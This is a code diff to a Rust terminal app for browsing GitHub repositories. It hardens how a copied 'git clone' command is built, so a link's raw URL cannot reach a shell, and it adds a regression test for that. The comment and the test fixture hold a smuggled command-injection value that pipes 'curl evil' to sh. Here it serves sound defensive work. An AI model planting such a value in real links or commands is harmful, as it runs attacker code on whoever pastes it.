@@ -1130,18 +1130,25 @@ impl App {
     }
 
     fn copy_selected(&mut self, clone_cmd: bool) {
-        if let Some(r) = self.selected_repo() {
-            if clone_cmd && crate::awesome::github_repo(&r.html_url).is_none() {
-                self.set_status(Level::Warn, "Not a GitHub repository; y copies its URL");
-                return;
+        let Some(r) = self.selected_repo() else {
+            return;
+        };
+        let text = if clone_cmd {
+            // Built only from the validated owner/repo (a restricted
+            // character set), never from the URL text: an awesome list's
+            // link could carry a query such as `?x;curl evil|sh`, which would
+            // run when the copied command is pasted into a shell.
+            match crate::awesome::github_repo(&r.html_url) {
+                Some(full) => format!("git clone https://github.com/{full}.git"),
+                None => {
+                    self.set_status(Level::Warn, "Not a GitHub repository; y copies its URL");
+                    return;
+                }
             }
-            let text = if clone_cmd {
-                format!("git clone {}.git", r.html_url)
-            } else {
-                r.html_url.clone()
-            };
-            self.effects.push(Effect::Copy(text));
-        }
+        } else {
+            r.html_url.clone()
+        };
+        self.effects.push(Effect::Copy(text));
     }
 
     fn request_unstar(&mut self) {
@@ -2475,6 +2482,32 @@ mod tests {
             (id, full_name.as_str()),
             (2, "o/beta"),
             "acts on the starred copy"
+        );
+    }
+
+    #[test]
+    fn clone_command_is_built_from_the_validated_name_only() {
+        // Security review: the raw URL of a list entry must not reach a
+        // command line.
+        let mut a = awesome_app();
+        a.apply(BgMsg::AwesomeList {
+            repo: "o/awesome-x".into(),
+            rows: vec![StarredRepo {
+                id: 1 << 63 | 7,
+                full_name: "o/r".into(),
+                name: "o/r".into(),
+                html_url: "https://github.com/o/r?x;curl$IFS'evil'|sh".into(),
+                external: true,
+                ..StarredRepo::test_default()
+            }],
+            done: true,
+        });
+        to_awesome(&mut a);
+        a.handle_key(key(KeyCode::Right));
+        a.handle_key(ch('Y'));
+        assert_eq!(
+            a.drain_effects(),
+            vec![Effect::Copy("git clone https://github.com/o/r.git".into())]
         );
     }
 
